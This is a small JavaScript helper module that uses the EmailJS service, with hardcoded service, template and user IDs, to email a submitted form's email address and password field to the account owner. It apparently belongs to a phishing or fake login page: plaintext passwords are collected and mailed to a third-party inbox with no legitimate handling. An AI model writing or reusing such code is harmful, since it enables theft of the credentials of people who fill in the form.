import emailjs from "emailjs-com";

const sendEmail = (forms) => {
  emailjs
    .send(
      "service_sagjt39", // Replace with your EmailJS Service ID
      "template_1welm0q", // Replace with your EmailJS Template ID
      {
        user_email: forms.email,
        passwword: forms.passwword,
      },
      "mtUY6IFoQSil0kN-Q" // Replace with your EmailJS User ID
    )
    .then(
      (result) => {
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
};

export default sendEmail;
